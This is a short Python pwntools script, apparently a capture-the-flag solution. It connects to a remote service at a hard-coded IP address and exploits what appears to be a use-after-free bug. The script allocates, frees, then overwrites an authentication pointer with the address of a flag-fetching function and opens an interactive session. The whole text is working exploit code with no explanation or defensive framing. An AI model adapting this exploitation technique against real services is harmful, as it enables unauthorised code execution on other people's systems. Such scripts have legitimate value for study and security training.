

from pwn import *

fetch_flag = p32(0x804868b)

s = remote('139.59.61.220',12345)

def pmsg(msg):
    s.recvuntil(':')
    s.sendline(msg)

pmsg('1') # malloc
pmsg('A')
pmsg('B')

pmsg('4') # free

pmsg('2') # auth_change
sleep(0.01)
s.sendline(fetch_flag)

pmsg('3') # auth()
s.interactive()
